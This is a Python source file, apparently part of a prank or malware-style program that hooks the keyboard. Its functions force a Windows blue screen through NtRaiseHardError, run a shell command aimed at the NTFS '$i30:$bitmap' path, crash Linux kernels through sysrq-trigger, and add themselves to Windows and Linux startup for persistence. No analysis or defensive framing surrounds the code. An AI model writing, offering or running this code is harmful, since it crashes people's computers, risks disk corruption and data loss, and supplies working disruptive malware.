#!/usr/bin/env python
# -*- coding: utf-8 -*-

import getpass
import os
import keyboard
import ctypes
import subprocess
import ctypes.wintypes
import platform

def get_os():
    system = platform.system()
    if system == "Windows":
        return "Windows"
    elif system == "Linux":
        return "Linux"
    else:
        return "Unsupported"

def bsod():
    subprocess.call("cd C:\:$i30:$bitmap", shell=True)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

def startup(path):
    USER_NAME = getpass.getuser()
    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    with open(os.path.join(bat_path, "open.bat"), "w+") as bat_file:
        bat_file.write(f'start "" "{path}"')

def simulate_kernel_panic():
    subprocess.call("echo 1 | sudo tee /proc/sys/kernel/sysrq", shell=True)
    subprocess.call("echo c | sudo tee /proc/sysrq-trigger", shell=True)

def add_to_startup(path):
    user_home = os.path.expanduser("~")
    autostart_dir = os.path.join(user_home, ".config", "autostart")
    os.makedirs(autostart_dir, exist_ok=True)
    desktop_file_path = os.path.join(autostart_dir, "my_program.desktop")
    with open(desktop_file_path, "w") as desktop_file:
        desktop_file.write(f"[Desktop Entry]\nName=my_program\nExec={path}\nType=Application")

def remove_from_startup():
    user_home = os.path.expanduser("~")
    autostart_dir = os.path.join(user_home, ".config", "autostart")
    desktop_file_path = os.path.join(autostart_dir, "my_program.desktop")
    if os.path.exists(desktop_file_path):
        os.remove(desktop_file_path)

def uninstall(wind):
    wind.destroy()
    os_type = get_os()
    if os_type == "Windows":
        bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        os.remove(os.path.join(bat_path, "open.bat"))
    elif os_type == "Linux":
        remove_from_startup()
    keyboard.unhook_all()
